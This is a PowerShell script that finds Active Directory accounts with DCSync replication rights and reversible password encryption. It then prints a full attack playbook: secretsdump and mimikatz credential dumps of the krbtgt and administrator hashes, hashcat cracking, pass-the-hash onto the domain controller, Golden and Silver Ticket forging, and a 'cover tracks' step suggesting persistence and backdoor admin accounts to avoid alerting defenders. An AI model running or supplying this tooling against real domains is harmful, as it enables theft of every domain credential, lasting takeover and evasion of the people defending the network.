# Ensure execution policy allows script run (if needed)
# powershell -ep bypass

Import-Module ActiveDirectory

# Get domain info
$domain = Get-ADDomain
$domainDN = $domain.DistinguishedName
$domainName = $domain.DNSRoot
$domainSID = $domain.DomainSID.Value

Write-Host "[*] Domain: $domainName" -ForegroundColor Cyan
Write-Host "[*] Domain SID: $domainSID" -ForegroundColor Cyan

# Get Domain Controllers - FIXED: Actually capture the DC names
$dcs = @((Get-ADDomainController -Filter *).HostName)
if ($dcs.Count -eq 0) {
    # Fallback if Get-ADDomainController fails
    $dcs = @((nslookup -type=SRV _ldap._tcp.dc._msdcs.$domainName 2>$null | 
              Select-String "internet address" | 
              ForEach-Object { ($_ -split 'internet address = ')[1].Trim() }) | Select-Object -First 1)
}

$primaryDC = $dcs[0]
Write-Host "[*] Primary Domain Controller: $primaryDC" -ForegroundColor Cyan

# Get all enabled domain users with more properties
$allUsers = Get-ADUser -Filter * -Properties sAMAccountName, Enabled, UserAccountControl, DistinguishedName, MemberOf, PasswordLastSet, LastLogonDate

Write-Host "[*] Found $($allUsers.Count) users total" -ForegroundColor Cyan
Write-Host "[*] Found $($allUsers | Where-Object {$_.Enabled}).Count) enabled users" -ForegroundColor Cyan

# Define replication GUIDs
$replicationGUIDs = @{
    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes'
    '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'DS-Replication-Get-Changes-All'
    '89e95b76-444d-4c62-991a-0facbeda640c' = 'DS-Replication-Get-Changes-In-Filtered-Set'
}

# Get domain ACL once (efficient)
$domainACL = Get-Acl "AD:\$domainDN"

Write-Host "`n[*] Checking DCSync rights for $($allUsers.Count) users..." -ForegroundColor Cyan
Write-Host ("-" * 80)

$dcsyncUsers = @()
$reversibleUsers = @()

foreach ($user in $allUsers) {
    $username = $user.sAMAccountName
    $uac = $user.UserAccountControl
    
    # Check for reversible encryption (0x0080 = 128)
    $isReversible = ($uac -band 0x0080) -ne 0
    if ($isReversible) {
        Write-Host "[!] Reversible encryption found: $username" -ForegroundColor Red
        $reversibleUsers += [PSCustomObject]@{
            Username = $username
            DN = $user.DistinguishedName
            Enabled = $user.Enabled
        }
    }
    
    # Check for DCSync rights
    $matches = $domainACL.Access | Where-Object {
        $_.IdentityReference -like "*\$username" -and
        $_.ObjectType -in $replicationGUIDs.Keys -and
        $_.ActiveDirectoryRights -match "ExtendedRight"
    }
    
    if ($matches) {
        $rights = $matches | ForEach-Object { $replicationGUIDs[$_.ObjectType.ToString()] }
        $rightsStr = $rights -join ', '
        
        Write-Host "[+] DCSync rights found: $username" -ForegroundColor Green
        Write-Host "    Rights: $rightsStr" -ForegroundColor DarkGreen
        
        $dcsyncUsers += [PSCustomObject]@{
            Username = $username
            Rights = $rightsStr
            Enabled = $user.Enabled
            Reversible = $isReversible
            DistinguishedName = $user.DistinguishedName
            SID = $user.SID.Value
        }
    }
}

# ========================
# 1. SHOW DETAILED INFO FOR DCSYNC USERS
# ========================
Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "DETAILED INFORMATION FOR DCSYNC USERS" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan

if ($dcsyncUsers) {
    foreach ($dcuser in $dcsyncUsers) {
        Write-Host "`n[*] DETAILS FOR: $($dcuser.Username)" -ForegroundColor Magenta
        
        # Get full user details
        $fullUser = Get-ADUser -Identity $dcuser.Username -Properties *
        
        Write-Host "  Basic Info:" -ForegroundColor Cyan
        Write-Host "    SID: $($fullUser.SID)" -ForegroundColor White
        Write-Host "    DN: $($fullUser.DistinguishedName)" -ForegroundColor White
        Write-Host "    Enabled: $($fullUser.Enabled)" -ForegroundColor $(if ($fullUser.Enabled) { "Green" } else { "Red" })
        Write-Host "    Last Logon: $($fullUser.LastLogonDate)" -ForegroundColor White
        Write-Host "    Password Last Set: $($fullUser.PasswordLastSet)" -ForegroundColor White
        
        Write-Host "  DCSync Rights:" -ForegroundColor Cyan
        Write-Host "    $($dcuser.Rights)" -ForegroundColor Green
        
        Write-Host "  Account Control Flags:" -ForegroundColor Cyan
        $uac = $fullUser.UserAccountControl
        $flags = @()
        if ($uac -band 0x0001) { $flags += "SCRIPT" }
        if ($uac -band 0x0002) { $flags += "ACCOUNTDISABLE" }
        if ($uac -band 0x0008) { $flags += "HOMEDIR_REQUIRED" }
        if ($uac -band 0x0010) { $flags += "LOCKOUT" }
        if ($uac -band 0x0020) { $flags += "PASSWD_NOTREQD" }
        if ($uac -band 0x0040) { $flags += "PASSWD_CANT_CHANGE" }
        if ($uac -band 0x0080) { $flags += "ENCRYPTED_TEXT_PWD_ALLOWED" }
        if ($uac -band 0x0100) { $flags += "TEMP_DUPLICATE_ACCOUNT" }
        if ($uac -band 0x0200) { $flags += "NORMAL_ACCOUNT" }
        if ($uac -band 0x0800) { $flags += "INTERDOMAIN_TRUST_ACCOUNT" }
        if ($uac -band 0x1000) { $flags += "WORKSTATION_TRUST_ACCOUNT" }
        if ($uac -band 0x2000) { $flags += "SERVER_TRUST_ACCOUNT" }
        if ($uac -band 0x10000) { $flags += "DONT_EXPIRE_PASSWORD" }
        if ($uac -band 0x20000) { $flags += "SMARTCARD_REQUIRED" }
        if ($uac -band 0x40000) { $flags += "TRUSTED_FOR_DELEGATION" }
        if ($uac -band 0x80000) { $flags += "NOT_DELEGATED" }
        if ($uac -band 0x100000) { $flags += "USE_DES_KEY_ONLY" }
        if ($uac -band 0x200000) { $flags += "DONT_REQ_PREAUTH" }
        if ($uac -band 0x400000) { $flags += "PASSWORD_EXPIRED" }
        if ($uac -band 0x800000) { $flags += "TRUSTED_TO_AUTH_FOR_DELEGATION" }
        if ($uac -band 0x1000000) { $flags += "PARTIAL_SECRETS_ACCOUNT" }
        
        Write-Host "    $($flags -join ', ')" -ForegroundColor White
        
        Write-Host "  Group Membership:" -ForegroundColor Cyan
        $groups = $fullUser.MemberOf | ForEach-Object {
            ($_ -split ',')[0] -replace 'CN='
        }
        if ($groups) {
            foreach ($group in $groups) {
                Write-Host "    - $group" -ForegroundColor White
            }
        } else {
            Write-Host "    No group memberships found" -ForegroundColor DarkGray
        }
        
        Write-Host "  Other Properties:" -ForegroundColor Cyan
        Write-Host "    When Created: $($fullUser.Created)" -ForegroundColor White
        Write-Host "    Description: $($fullUser.Description)" -ForegroundColor White
        if ($fullUser.EmailAddress) {
            Write-Host "    Email: $($fullUser.EmailAddress)" -ForegroundColor White
        }
        if ($fullUser.Title) {
            Write-Host "    Title: $($fullUser.Title)" -ForegroundColor White
        }
        if ($fullUser.Department) {
            Write-Host "    Department: $($fullUser.Department)" -ForegroundColor White
        }
    }
} else {
    Write-Host "[*] No DCSync users found." -ForegroundColor Yellow
}

# ========================
# 2. EXPLICIT NEXT COMMANDS TO PERFORM - CORRECTED
# ========================
Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "NEXT STEPS - EXPLICIT COMMANDS TO RUN" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan

if ($dcsyncUsers) {
    $firstDCSyncUser = $dcsyncUsers[0].Username
    
    Write-Host "`n[STEP 1] VERIFY CREDENTIALS FOR $firstDCSyncUser" -ForegroundColor Green
    Write-Host "  # First, ensure you have valid credentials for this user." -ForegroundColor White
    Write-Host "  # Test authentication:" -ForegroundColor White
    Write-Host "  net use \\$primaryDC /user:$domainName\$firstDCSyncUser" -ForegroundColor Cyan
    
    Write-Host "`n[STEP 2] PERFORM DCSYNC ATTACK USING IMPACKET" -ForegroundColor Green
    Write-Host "  # Full domain dump (all hashes):" -ForegroundColor White
    Write-Host "  secretsdump.py -outputfile $domainName`_hashes -just-dc $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
    
    Write-Host "`n  # Dump only KRBTGT account (for Golden Ticket):" -ForegroundColor White
    Write-Host "  secretsdump.py -outputfile krbtgt_hash -just-dc-user krbtgt $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
    
    Write-Host "`n  # Dump specific user (e.g., administrator):" -ForegroundColor White
    Write-Host "  secretsdump.py -outputfile admin_hash -just-dc-user administrator $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
    
    Write-Host "`n  # Get password history:" -ForegroundColor White
    Write-Host "  secretsdump.py -history -just-dc $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
    
    Write-Host "`n  # Useful flags for reporting:" -ForegroundColor White
    Write-Host "  secretsdump.py -pwd-last-set -user-status -just-dc $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
    
    Write-Host "`n[STEP 3] PERFORM DCSYNC ATTACK USING MIMIKATZ" -ForegroundColor Green
    Write-Host "  # First run as the DCSync user:" -ForegroundColor White
    Write-Host "  runas /netonly /user:$domainName\$firstDCSyncUser powershell" -ForegroundColor Cyan
    Write-Host "  # Enter password when prompted" -ForegroundColor DarkGray
    
    Write-Host "`n  # Then in mimikatz:" -ForegroundColor White
    Write-Host "  privilege::debug" -ForegroundColor Cyan
    Write-Host "  lsadump::dcsync /domain:$domainName /user:krbtgt" -ForegroundColor Cyan
    Write-Host "  lsadump::dcsync /domain:$domainName /user:administrator" -ForegroundColor Cyan
    
    Write-Host "`n[STEP 4] CHECK FOR REVERSIBLE ENCRYPTION PASSWORDS" -ForegroundColor Green
    if ($reversibleUsers) {
        Write-Host "  [!] THESE USERS WILL HAVE CLEARTEXT PASSWORDS IN DUMP:" -ForegroundColor Red
        foreach ($revUser in $reversibleUsers) {
            Write-Host "  - $($revUser.Username)" -ForegroundColor Red
        }
        Write-Host "`n  In the secretsdump output, look for lines like:" -ForegroundColor White
        Write-Host "  username:CLEARTEXT:password_here!" -ForegroundColor Cyan
        Write-Host "`n  # You can also dump just these users:" -ForegroundColor White
        foreach ($revUser in $reversibleUsers) {
            Write-Host "  secretsdump.py -just-dc-user $($revUser.Username) $domainName/$firstDCSyncUser@$primaryDC" -ForegroundColor Cyan
        }
    } else {
        Write-Host "  [✓] No reversible encryption users found" -ForegroundColor Green
    }
    
    Write-Host "`n[STEP 5] POST-EXPLOITATION (After getting hashes)" -ForegroundColor Green
    Write-Host "  # Crack NTLM hashes with hashcat:" -ForegroundColor White
    Write-Host "  hashcat -m 1000 -a 0 $domainName`_hashes.ntds rockyou.txt -o cracked.txt" -ForegroundColor Cyan
    
    Write-Host "`n  # Pass-the-hash with administrator:" -ForegroundColor White
    Write-Host "  # First get the administrator hash from the dump" -ForegroundColor DarkGray
    Write-Host "  pth-winexe -U administrator%HASH_HERE //$primaryDC cmd.exe" -ForegroundColor Cyan
    
    Write-Host "`n  # Create Golden Ticket (need KRBTGT hash):" -ForegroundColor White
    Write-Host "  # Extract KRBTGT hash from the dump first" -ForegroundColor DarkGray
    Write-Host "  ticketer.py -nthash KRBTGT_HASH -domain-sid $domainSID -domain $domainName administrator" -ForegroundColor Cyan
    
    Write-Host "`n  # Create Silver Ticket (for specific service):" -ForegroundColor White
    Write-Host "  ticketer.py -nthash MACHINE_ACCOUNT_HASH -domain-sid $domainSID -domain $domainName -spn cifs/dc01.$domainName administrator" -ForegroundColor Cyan
    
    Write-Host "`n[STEP 6] COVER TRACKS (Optional - Use with caution)" -ForegroundColor Green
    Write-Host "  # Remove DCSync rights after attack (remove each right separately):" -ForegroundColor White
    Write-Host "  # Using DSInternals module or manual ADSI edit recommended" -ForegroundColor DarkGray
    Write-Host "`n  # Method 1: Using Remove-ADObjectRights (requires AD module):" -ForegroundColor White
    foreach ($guid in $replicationGUIDs.Keys) {
        Write-Host "  Remove-ADObjectRights -Identity '$domainDN' -Principal '$firstDCSyncUser' -AccessRights 'ExtendedRight' -ObjectType $guid -WhatIf" -ForegroundColor Cyan
    }
    
    Write-Host "`n  # Method 2: Manual PowerShell (more reliable):" -ForegroundColor White
    Write-Host "  `$user = Get-ADUser -Identity '$firstDCSyncUser'" -ForegroundColor Cyan
    Write-Host "  `$acl = Get-Acl 'AD:\$domainDN'" -ForegroundColor Cyan
    Write-Host "  `$acl.Access | Where {`$_.IdentityReference -eq `$user.SID} | ForEach {`$acl.RemoveAccessRule(`$_)}" -ForegroundColor Cyan
    Write-Host "  Set-Acl 'AD:\$domainDN' `$acl" -ForegroundColor Cyan
    
    Write-Host "`n  # Note: Removing rights may alert defenders. Consider:" -ForegroundColor Yellow
    Write-Host "  # 1. Dumping everything first" -ForegroundColor White
    Write-Host "  # 2. Creating Golden Ticket for persistence" -ForegroundColor White
    Write-Host "  # 3. Adding backdoor admin accounts" -ForegroundColor White
    
} else {
    Write-Host "[!] No DCSync users found. Try checking:" -ForegroundColor Yellow
    Write-Host "  1. Domain Admins group members (they have implicit DCSync rights)" -ForegroundColor White
    Write-Host "  2. Enterprise Admins group members" -ForegroundColor White
    Write-Host "  3. Run: Get-ADGroupMember 'Domain Admins' | Get-ADUser -Properties *" -ForegroundColor Cyan
}

# Additional security checks
Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "ADDITIONAL SECURITY CHECKS" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan

Write-Host "`n[*] Checking KRBTGT account age..." -ForegroundColor Cyan
try {
    $krbtgt = Get-ADUser -Identity krbtgt -Properties PasswordLastSet
    $pwdAge = (Get-Date) - $krbtgt.PasswordLastSet
    Write-Host "  KRBTGT password last changed: $($krbtgt.PasswordLastSet)" -ForegroundColor White
    Write-Host "  Password age: $($pwdAge.Days) days" -ForegroundColor $(if ($pwdAge.Days -gt 180) { "Red" } else { "Green" })
    
    if ($pwdAge.Days -gt 180) {
        Write-Host "  [!] KRBTGT password >180 days old - consider rotating for security!" -ForegroundColor Red
    }
} catch {
    Write-Host "  [-] Could not retrieve KRBTGT info" -ForegroundColor Yellow
}

# Summary
Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "SUMMARY" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan

Write-Host "`n[*] DCSync Users found: $($dcsyncUsers.Count)" -ForegroundColor $(if ($dcsyncUsers.Count -gt 0) { "Red" } else { "Green" })
if ($dcsyncUsers) {
    $dcsyncUsers | Format-Table -AutoSize -Property Username, Rights, Enabled, @{
        Name = "Reversible"
        Expression = { if ($_.Reversible) { "YES" } else { "no" } }
    }
}

Write-Host "`n[*] Reversible encryption users: $($reversibleUsers.Count)" -ForegroundColor $(if ($reversibleUsers.Count -gt 0) { "Red" } else { "Green" })
if ($reversibleUsers) {
    Write-Host "  $($reversibleUsers.Username -join ', ')" -ForegroundColor $(if ($reversibleUsers.Count -gt 0) { "Red" } else { "White" })
}

Write-Host "`n[*] Primary Domain Controller: $primaryDC" -ForegroundColor Cyan

# Save findings to file
Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "SAVING FINDINGS" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "DCSync_Findings_${domainName}_${timestamp}.txt"

$report = @"
=== DCSYNC ENUMERATION REPORT ===
Generated: $(Get-Date)
Domain: $domainName
Domain SID: $domainSID
Primary DC: $primaryDC

=== CRITICAL FINDINGS ===
DCSync Users: $($dcsyncUsers.Count)
Reversible Encryption Users: $($reversibleUsers.Count)

=== DCSYNC USERS ===
$(($dcsyncUsers | Format-Table -Property Username, Rights, Enabled, Reversible, SID | Out-String).Trim())

=== REVERSIBLE ENCRYPTION USERS ===
$(($reversibleUsers | Format-Table -Property Username, Enabled, DN | Out-String).Trim())

=== ATTACK COMMANDS ===
secretsdump.py -just-dc $domainName/$firstDCSyncUser@$primaryDC
secretsdump.py -just-dc-user krbtgt $domainName/$firstDCSyncUser@$primaryDC
"@

$report | Out-File -FilePath $outputFile -Encoding UTF8
Write-Host "[+] Report saved to: $outputFile" -ForegroundColor Green

Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "SCAN COMPLETE" -ForegroundColor Green
Write-Host "=" * 80 -ForegroundColor Cyan
